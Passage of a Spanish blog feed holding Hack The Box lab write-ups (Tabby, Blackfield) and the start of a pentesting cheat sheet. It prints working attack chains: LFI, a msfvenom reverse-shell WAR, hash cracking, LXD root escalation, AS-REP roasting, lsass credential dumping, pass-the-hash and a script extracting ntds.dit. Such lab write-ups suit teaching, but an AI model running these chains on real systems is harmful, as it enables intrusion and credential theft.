/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://megahosting.htb/news.php\?file\=../../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml -<span class="built_in">fc</span> 404,401 -fs 0</span><br></pre></td></tr></table></figure><blockquote><pre><code> /&apos;___\  /&apos;___\           /&apos;___\/\ \__/ /\ \__/  __  __  /\ \__/\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/  \ \_\   \ \_\  \ \____/  \ \_\   \/_/    \/_/   \/___/    \/_/v1.0.2</code></pre><hr><p>:: Method           : GET<br> :: URL              : <a href="http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml" target="_blank" rel="noopener">http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml</a><br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Timeout          : 10<br> :: Threads          : 40<br> :: Matcher          : Response status: 200,204,301,302,307,401,403<br> :: Filter           : Response status: 404,401<br> :: Filter           : Response size: 0</p><hr></blockquote><blockquote><p>etc                     [Status: 200, Size: 2325, Words: 361, Lines: 48]</p></blockquote><p>Encontramos el xml, vemos el user y una password de tomcat.</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">username</span>=<span class="string">"tomcat"</span> <span class="attr">password</span>=<span class="string">"$3cureP4s5w0rd123!"</span> <span class="attr">roles</span>=<span class="string">"admin-gui,manager-script"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/7qWZfMH.png" alt></p><h2><a href="#rce" class="header-anchor">#</a><span id="rce">RCE</span></h2><p>Creación del payload con metasploit con extension war.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure><p>Subir el war file, lo hacemos con curl porque no tenemos permisos de la interfaz html para ello necessitariamos ser tambien ==manager-gui==, pero al ser ==manager-script== nos permite la subida de ficheros war. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -u tomcat:<span class="string">'$3cureP4s5w0rd123!'</span> -T shell.war <span class="string">'http://tabby.htb:8080/manager/text/deploy?path=/shell&amp;update=true'</span></span><br></pre></td></tr></table></figure><blockquote><p>OK - Deployed application at context path [/shell]</p></blockquote><p>Vemos que podemos comprovar si el fichero se ha subido correctamente como dice en la web de la siguiente forma.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -u tomcat:<span class="string">'$3cureP4s5w0rd123!'</span> http://tabby.htb:8080/manager/text/list</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/G4IxakX.png" alt></p><p>Ejecucion de la shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -u tomcat:<span class="string">'$3cureP4s5w0rd123!'</span> http://tabby.htb:8080/shell/</span><br></pre></td></tr></table></figure><h1><a href="#usuario-ash" class="header-anchor">#</a><span id="usuario-ash">Usuario - ASH</span></h1><p>Vemos un arvhivo backup en <em>/var/www/html/files</em></p><h2><a href="#craquear-el-zip" class="header-anchor">#</a><span id="craquear-el-zip">Craquear el zip</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip</span><br></pre></td></tr></table></figure><blockquote><p>PASSWORD FOUND!!!!: pw == admin@it</p></blockquote><p>Probamos de loguearnos con la password para el user. Y nos devuelve la shell. </p><p><img src="https://i.imgur.com/Rgn3QHl.png" alt></p><h1><a href="#escalacion-de-privilegios-root" class="header-anchor">#</a><span id="escalacion-de-privilegios-root">Escalación de Privilegios - ROOT</span></h1><p>Si vemos dentro del directiorio snap vemos un programa donde logicamente tenemos estamos dentro del grupo.</p><p><img src="https://i.imgur.com/YJwLNBi.png" alt></p><p>Vemos que hay una possible escalacion por ese programa. Ya que cualquier miembro local que pertenezca en este grupo puede immediatamente escalar privilegios hacia al user root. </p><h2><a href="#preparacion-de-la-escalacion-de-privilegios" class="header-anchor">#</a><span id="preparacion-de-la-escalacion-de-privilegios">Preparación de la escalación de privilegios</span></h2><p>El primer passo es descargarse el build alpine. Para ejecutarlo en la maquina atacante, para ello tenemos que hacerlo con nuestro root user. Y luego transferir este archivo tar que se nos ha creado a la maquina victima. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">sudo ./build-alpine</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/IzB4VBa.png" alt></p><p>Ahora toca transferir nuestro fichero al directiorio home del usuario, és importante que sea en el home ya que sino no encuentra el tar. </p><p><img src="https://i.imgur.com/9WWvoOP.png" alt></p><p>El siguiente paso es crear la imagen con el LXD. </p><p><img src="https://i.imgur.com/2T7L7NI.png" alt></p><p>És importante leer porque nos dice que como és la primera vez que lo ejecutamos nos pide que antes utilizemos lxd init para crear la pool y asi no tener errores al crear el container. </p><p>Dejamos todo por defecto y al final listamos las imagenes. </p><p><img src="https://i.imgur.com/jPU8ebq.png" alt></p><p>Por ultimo, queda crear el container y ejecutarlo como root. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lxc init ShadowImage ShadowDC -c security.privileged=<span class="literal">true</span></span><br><span class="line">lxc config device add ShadowDC mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">lxc start ShadowDC</span><br><span class="line">lxc <span class="built_in">exec</span> ShadowDC /bin/sh</span><br><span class="line">id</span><br></pre></td></tr></table></figure><p>Comprovación en la maquina victima. </p><p><img src="https://i.imgur.com/A65CTHw.png" alt></p><p>Y la flag la encontramos en la ubicacion <em>/mnt/root/root/root.txt</em></p><h1><a href="#obteneindo-accesso-por-ssh" class="header-anchor">#</a><span id="obteneindo-accesso-por-ssh">Obteneindo accesso por ssh</span></h1><p>Vemos que hay el puerto ssh asi que añadiremos una llave autorizada para poder acceder como root. Los passos son los siguientes:</p><p><img src="https://i.imgur.com/xdC94Bv.png" alt></p><p>Lo pegamos en la maquina victima.</p><p><img src="https://i.imgur.com/3ItWxfY.png" alt></p><p>Y ya tenemos shell por ssh. </p><p><img src="https://i.imgur.com/nBjl17D.png" alt></p><p>Enlaces: </p><p>LFI - <a href="https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601" target="_blank" rel="noopener">https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601</a></p><p>Creación del payload war - <a href="https://netsec.ws/?p=331" target="_blank" rel="noopener">https://netsec.ws/?p=331</a></p><p>Tomcat listar los ficheros subidos - <a href="https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#List_Currently_Deployed_Applications" target="_blank" rel="noopener">https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#List_Currently_Deployed_Applications</a></p><p>Fcrackzip - <a href="https://pentaroot.com/cracking-encrypted-zip-fcrackzip/" target="_blank" rel="noopener">https://pentaroot.com/cracking-encrypted-zip-fcrackzip/</a></p><p>lxd PrivEsc - <a href="https://www.hackingarticles.in/lxd-privilege-escalation/" target="_blank" rel="noopener">https://www.hackingarticles.in/lxd-privilege-escalation/</a></p><p>Creación de llaves SSH - <a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys--2" target="_blank" rel="noopener">https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys--2</a></p>]]></content>
      
      
      <categories>
          
          <category> HTB </category>
          
          <category> Linux </category>
          
          <category> API Tomcat </category>
          
          <category> LFI </category>
          
          <category> ffuf </category>
          
          <category> fcraczip </category>
          
          <category> lxd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blackfiel Writeup</title>
      <link href="/2020/06/26/Blackfield/"/>
      <url>/2020/06/26/Blackfield/</url>
      
        <content type="html"><![CDATA[<h1><a href="#enumeracion" class="header-anchor">#</a><span id="enumeracion">Enumeración</span></h1><p>Enumeración de puertos </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- --open -v -n -T5 -Pn 10.10.10.102</span><br></pre></td></tr></table></figure><p>Enumeracion con el script por defecto con los puertos obtenidos del escaneo anterior.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p53,445,135,5985,88,389,3268 -oN allports -Pn blackfield.htb</span><br></pre></td></tr></table></figure><blockquote><p>PORT     STATE SERVICE       VERSION<br>53/tcp   open  domain?<br>| fingerprint-strings:<br>|   DNSVersionBindReqTCP:<br>|     version<br>|_    bind<br>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-20 22:32:15Z)<br>135/tcp  open  msrpc         Microsoft Windows RPC<br>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)<br>445/tcp  open  microsoft-ds?<br>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)<br>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service" target="_blank" rel="noopener">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br>SF-Port53-TCP:V=7.80%I=7%D=6/20%Time=5EEE2BD1%P=x86_64-pc-linux-gnu%r(DNSV<br>SF:ersionBindReqTCP,20,”\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version<br>SF:x04bind\0\0\x10\0\x03”);<br>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</p></blockquote><blockquote><p>Host script results:<br>|<em>clock-skew: 7h00m49s<br>| smb2-security-mode:<br>|   2.02:<br>|</em>    Message signing enabled and required<br>| smb2-time:<br>|   date: 2020-06-20T22:34:36<br>|_  start_date: N/A</p></blockquote><p>Vemos que hay el puerto 445 abierto, hacemos un null session para listar los directiorios y obtenemos la siguiente respuesta:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L &#x2F;&#x2F;10.10.10.192 -N_</span><br></pre></td></tr></table></figure><blockquote><pre><code> Sharename       Type      Comment---------       ----      ------- ADMIN$          Disk      Remote Admin C$              Disk      Default share forensic        Disk      Forensic / Audit share. IPC$            IPC       Remote IPC NETLOGON        Disk      Logon server share profiles$       Disk SYSVOL          Disk      Logon server share</code></pre></blockquote><p>El siguiente passo és enumerar esos directorios para hacerlo utilizaremos ==smbclient \\&lt;IP<i>&gt;\&lt;Directorio<d>&gt; -N==</d></i></p><p>Peró queremos automatizarlo por no ir uno a uno para ello creamos el siguiente script en bash muy basico. </p><p>Una vez listado los directorios creamos un pequeño script para guardarlos en un fixero. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.10.192/ -N &gt; f.txt &amp;&amp; cat f.txt | awk <span class="string">'&#123;print $1&#125;'</span> | tail -n +4 &gt; folders.txt &amp;&amp; rm f.txt</span><br></pre></td></tr></table></figure><p>Y vemos y listamos todos los que tenemos permisos. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> fol <span class="keyword">in</span> $(cat folders.txt); <span class="keyword">do</span> <span class="built_in">echo</span> -n <span class="string">"Try: <span class="variable">$fol</span> - \n"</span>; smbclient //10.10.10.192/<span class="variable">$fol</span> -c dir -N;<span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>Vemos una larga lista de los usuarios asi que lo guardamos en un documento para hacer fuerza bruta y enumerar. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.10.192/profiles$ -N -c dir &gt; tempusers.txt; cat tempusers.txt | awk <span class="string">'&#123;print $1&#125;'</span> &gt; users.txt; rm tempusers.txt</span><br></pre></td></tr></table></figure><p>Ahora con un bucle for probamos haber los usuarios que existen y si alguno se puede loguear con null session.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> $(cat users.txt); <span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">msn=$(rpcclient 10.10.10.192 -U <span class="variable">$user</span> -N | tail -1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ $(<span class="built_in">echo</span> <span class="string">"<span class="variable">$msn</span>"</span> | grep -v <span class="string">"ACCESS_DENIED"</span>) ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"User exist: <span class="variable">$user</span>"</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>El output és el siguiente, vemos que ninguno de ellos és possible tener una session nula.</p><blockquote><p><em>User exist: audit2020</em><br><em>User exist: support</em><br><em>User exist: svc_backup</em></p></blockquote><h1><a href="#user-1-support" class="header-anchor">#</a><span id="user-1-support">USER 1 : support</span></h1><p>Los metemos en un fichero, que se llamara users.txt.<br>Utilizaremos el script GetNPUser.py_, para lograr los tickets de kerberos que no necessita preautentificación. <a href="https://www.hackingarticles.in/abusing-kerberos-using-impacket/" target="_blank" rel="noopener"> Clica para más información </a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py BLACKFIELD.local/ -usersfile users.txt -request -dc-ip 10.10.10.192</span><br></pre></td></tr></table></figure><blockquote><p>$krb5asrep$23$support@BLACKFIELD.LOCAL:f72434fff2bed49682c2566af5b92e1d$62bd6347ae54e6f0172703c53c383b0afed413e3396f6b79d1315e58f8817f04e316ca720cdb6faf15e4049fa822fb5d5c0069d1db841a30fb0bb7bfb599f5f88ee0305eb3ef87e8121a18def9e4e5a3756e9d39a76978dfee3127ef40684b646e28eea5bd7ed0a6180ac3572a97650c8ed499275b27785e437d7e81679fb6582e4c7212497509eb59fe67088cea8414131a885449928aca9ae9a780e51a8acb96993311ee0d042a47ac5e3f29b24044adff29f6dbeb5b2bea6e3a7b65b4c034e4fa99f0bfc85bf9c60758997522d7f50abf5edab22778bafb2d27439fa2897280460cf2b7aee9b7738a2bf2d094b054f9aaf039`</p></blockquote><p>Guardamos este output en un archivo llamado support.hash y con hashcat procedemos a lograr la contraseña de kerbereos. <a href="https://github.com/frizb/Hashcat-Cheatsheet#cracking-hashes-from-kerboroasting---krb5tgs" target="_blank" rel="noopener">Hashcat Cheat sheet</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 -a 0 -w 3 support.hash /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure><p>Obtenemos la siguiente respuesta<br><code>#00^BlackKnight</code></p><h1><a href="#user-2-audit2020" class="header-anchor">#</a><span id="user-2-audit2020">USER 2 : audit2020</span></h1><p>Vemos que tenemos acceso desde rpcclient y los permisos que tenemos como usuario nos permite cambiar la password RPC del user audit2020, primero introduciendo la nueva contraseña del usuario y luego la del usuario support. </p><p><img src="https://i.imgur.com/RsFzDEt.png" alt></p><h1><a href="#user-3-svc-backup" class="header-anchor">#</a><span id="user-3-svc-backup">USER 3 : svc_backup</span></h1><p>Ahora tenemos de nuevo accesos a mas directiorios del samba concretamente al forensics.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\10.10.10.192\\forensic --user=audit2020%Test1234 -c <span class="string">'prompt OFF;recurse ON; cd memory_analysis; mget *'</span></span><br></pre></td></tr></table></figure><p>Vemos que hay un zip que se llama lssa descomprimimos y podemos ver credenciales dentro. Con lo siguiente: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pypykatz lsa minidump lsass.DMP</span><br></pre></td></tr></table></figure><p>Como información importante e interesante encontramos esto. </p><blockquote><p>== MSV ==<br>        Username: svc_backup<br>        Domain: BLACKFIELD<br>        LM: NA<br>        NT: 9658d1d1dcd9250115e2205d9f48400d<br>        SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c</p></blockquote><p>Vemos directamente que és possible loguearnos haciendo un pass de hash en evil-winrm </p><p><img src="https://i.imgur.com/UBkhp59.png" alt></p><h1><a href="#escalacion-de-privilegios-administrator" class="header-anchor">#</a><span id="escalacion-de-privilegios-administrator">Escalación de privilegios : Administrator</span></h1><p>Hacemos la enumeración basica para escalación de privilegios.</p><p>Iniciamos con un ==whoami /all== y vemos información interesante en los privilegios. </p><p><img src="https://i.imgur.com/Oz4ITL8.png" alt></p><h2><a href="#preparacion-del-exploit" class="header-anchor">#</a><span id="preparacion-del-exploit">Preparación del exploit</span></h2><p>Buscamos como extraer el archivo NTDS.dit y el registro del sistema ya que nuestro usuario tiene permisos de backup.<br>El script que usamos es necessario <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow" target="_blank" rel="noopener">DiskShadow</a> para copiar y extraer información al volumen Shadow.</p><p>Para abusar de este script primero es necessario tener descargado estos dos dll que los encontramos en el repositorio <em><a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug" target="_blank" rel="noopener">https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug</a></em></p><p>A mi personalmente me gusta crear un directiorio temporal para ser el menos visible y asi és mucho más fàcil trabajar desde allí.</p><p>Subimos los archivos en ese directorio. </p><p><img src="https://i.imgur.com/Ww2qr7Y.png" alt></p><p>Y ahora nos descargamos el siguiente script automatizado para lograr la escalación de privilegios. <a href="https://raw.githubusercontent.com/return-z/SeBackupPrivilege-Abuse/master/SeBackupPrivAbuse.ps1" target="_blank" rel="noopener">SeBackupPrivAbuse.ps1</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#PS Script to use the SeBackupPrivilege for extracting the ntds.dit file and reg system file</span></span><br><span class="line"><span class="comment">#Purely for educational purposes. Illegal purposes are not intended.</span></span><br><span class="line"><span class="comment">#Not completely my ideas. Taken from a few sources and put together in one place.</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$current_path</span> = <span class="built_in">Get-Location</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Uncomment the lines below if https connenction is allowed or working, otherwise download the dlls and save on the machine</span></span><br><span class="line"><span class="comment">#Invoke-WebRequest -Uri "https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll" -OutFile "SeBackupPrivilegeUtils.dll"</span></span><br><span class="line"><span class="comment">#Invoke-WebRequest -Uri "https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll" -OutFile "SeBackupPrivilegeCmdLets.dll"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Import-Module</span> .\SeBackupPrivilegeUtils.dll</span><br><span class="line"><span class="built_in">Import-Module</span> .\SeBackupPrivilegeCmdLets.dll</span><br><span class="line"><span class="built_in">Set-SeBackupPrivilege</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#set ACL in the windows folder</span></span><br><span class="line"><span class="variable">$path</span> = <span class="string">"C:\windows\"</span></span><br><span class="line"><span class="variable">$user</span> = <span class="string">"DOMAIN\USER"</span>     <span class="comment">#EDIT THIS LINE BEFORE USAGE</span></span><br><span class="line"><span class="variable">$acl</span> = <span class="built_in">get-acl</span> <span class="literal">-Path</span> <span class="variable">$path</span></span><br><span class="line"><span class="variable">$acl_rule</span> = <span class="variable">$user</span>,<span class="string">'FullControl'</span>,<span class="string">'ContainerInherit,ObjectInherit'</span>,<span class="string">'None'</span>,<span class="string">'Allow'</span></span><br><span class="line"><span class="variable">$access_rule</span> = <span class="built_in">New-Object</span> System.Security.AccessControl.FileSystemAccessRule <span class="variable">$acl_rule</span></span><br><span class="line"><span class="variable">$acl</span>.AddAccessRule(<span class="variable">$access_rule</span>)</span><br><span class="line"><span class="built_in">Set-Acl</span> <span class="literal">-Path</span> <span class="variable">$path</span> <span class="literal">-AclObject</span> <span class="variable">$acl</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Creating a script file for DiskShadow</span></span><br><span class="line"><span class="string">"set metadata C:\windows\temp\metadata.cab"</span> | <span class="built_in">Out-File</span> script.txt <span class="literal">-encoding</span> ascii</span><br><span class="line"><span class="string">"set context persistent nowriters"</span> | <span class="built_in">Out-File</span> script.txt <span class="literal">-encoding</span> ascii <span class="literal">-append</span></span><br><span class="line"><span class="string">"begin backup"</span> | <span class="built_in">Out-File</span> script.txt <span class="literal">-encoding</span> ascii <span class="literal">-append</span></span><br><span class="line"><span class="string">"add volume c: alias mydrive"</span> | <span class="built_in">Out-File</span> script.txt <span class="literal">-encoding</span> ascii <span class="literal">-append</span></span><br><span class="line"><span class="string">"create"</span> | <span class="built_in">Out-File</span> script.txt <span class="literal">-encoding</span> ascii <span class="literal">-append</span></span><br><span class="line"><span class="string">"expose %mydrive% k:"</span> | <span class="built_in">Out-File</span> script.txt <span class="literal">-encoding</span> ascii <span class="literal">-append</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Using DiskShadow to get create a Volume Shadow Copy</span></span><br><span class="line">cd /windows/system32</span><br><span class="line">cmd /c <span class="string">"diskshadow.exe /s <span class="variable">$current_path</span>\\script.txt"</span></span><br><span class="line"><span class="built_in">Copy-FileSeBackupPrivilege</span> k:\windows\ntds\ntds.dit <span class="variable">$current_path</span>\\ntds.dit <span class="literal">-Overwrite</span></span><br><span class="line">cd <span class="variable">$current_path</span></span><br><span class="line">del script.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#Cleanup </span></span><br><span class="line"><span class="string">"delete shadows exposed k:"</span> | <span class="built_in">Out-File</span> script.txt <span class="literal">-encoding</span> ascii <span class="literal">-append</span></span><br><span class="line"><span class="string">"exit"</span> | <span class="built_in">Out-File</span> script.txt <span class="literal">-encoding</span> ascii <span class="literal">-append</span></span><br><span class="line">cd /windows/system32</span><br><span class="line">cmd /c <span class="string">"diskshadow.exe /s <span class="variable">$current_path</span>\\script.txt"</span></span><br><span class="line">cd <span class="variable">$current_path</span></span><br><span class="line">del script.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#Get the system registry hive</span></span><br><span class="line">cmd /c <span class="string">"reg.exe save hklm\system .\system.bak"</span></span><br></pre></td></tr></table></figure><p>Ahora obtendremos los dos ficheros, los descargamos para poder<br>obtener el hash Administrador, utilizando SecretsDump.py_.</p><p><img src="https://i.imgur.com/bz5s05Q.png" alt></p><p>Accedemos al user Administrator y obtenemos la flag del root.</p><p><img src="https://i.imgur.com/bqzx0ig.png" alt><br></p>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
          <category> HTB </category>
          
          <category> Active Directory </category>
          
          <category> kerberos </category>
          
          <category> hashcat </category>
          
          <category> rpcclient </category>
          
          <category> disckshadow </category>
          
          <category> evil-winrm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>Pentesting Cheat Sheet</title>
      <link href="/apuntes/index.html"/>
      <url>/apuntes/index.html</url>
      
        <content type="html"><![CDATA[<h1><a href="#pentesting-cheat-sheet" class="header-anchor">#</a><span id="pentesting-cheat-sheet">Pentesting Cheat sheet</span></h1><div class="toc"><!-- toc --><!-- tocstop --></div><h2><a href="#potential-ports-vulnerabilities" class="header-anchor">#</a><span id="potential-ports-vulnerabilities">Potential ports vulnerabilities</span></h2><ul><li>21 [FTP] It’s possible have anonymous user.</li><li>22 [SSH] It’s not probable have any vulnerabilities but is the best choise if found some credentials for try first. </li><li>80 [HTTP] This is a web server. First detect the version about server it’s running, then try to find all directories and the virtual host.</li><li>110 / 995(ssl) [POP3] This protocol used by email clients. Try the common passwords. </li><li>143 / 993 [IMAP] Permit complete management of emails box by multiple email clients.</li><li>445 [HTTPS] Like HTTP protocol it’s web server, and we can do the same. But we can enumerate SSL/TLS certificates on OpenSSL 1.1.0 and lower. </li></ul><h1><a href="#enmeration" class="header-anchor">#</a><span id="enmeration">Enmeration!</span></h1><h2><a href="#port-scanning" class="header-anchor">#</a><span id="port-scanning">Port Scanning</span></h2><p>Basic port scaning with bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> &#123;1..65535&#125;; <span class="keyword">do</span></span><br><span class="line">  timeout 1 bash -c <span class="string">"echo &gt;/dev/tcp/10.10.10.10/<span class="variable">$port</span>"</span> &amp;&amp;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"[*] <span class="variable">$port</span> is open"</span> ||</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"[*] <span class="variable">$port</span> is closed"</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h3><a href="#nmap" class="header-anchor">#</a><span id="nmap">NMAP</span></h3><p><a href="https://nmap.org/" target="_blank" rel="noopener">https://nmap.org/</a></p><blockquote><p>Scripts define a list of categories they belong to. Currently defined categories are auth, broadcast, brute, default. discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln. Category names are not case sensitive. </p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /urs/share/nmap/scripts</span><br></pre></td></tr></table></figure><p>First nmap agressive scan for see all open ports</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5  -p- --open -v -n 10.10.10.10</span><br></pre></td></tr></table></figure><p>When I have all open ports, I can do the second scan for enumeration with default script and the versions of the ports. Parameters -sC equals –script=default</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p22,80,445 10.10.10.10</span><br></pre></td></tr></table></figure><p>ARP Scan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -sn -PR 10.10.10.10/24</span><br></pre></td></tr></table></figure><p>Reverse DNS Lookup</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sL 10.10.10.10/24</span><br></pre></td></tr></table></figure><p>Using script </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -Pn --script <span class="string">"vuln and safe"</span> 10.10.10.10/24</span><br></pre></td></tr></table></figure><h2><a href="#http-tools" class="header-anchor">#</a><span id="http-tools">HTTP TOOLS</span></h2><h3><a href="#nikto" class="header-anchor">#</a><span 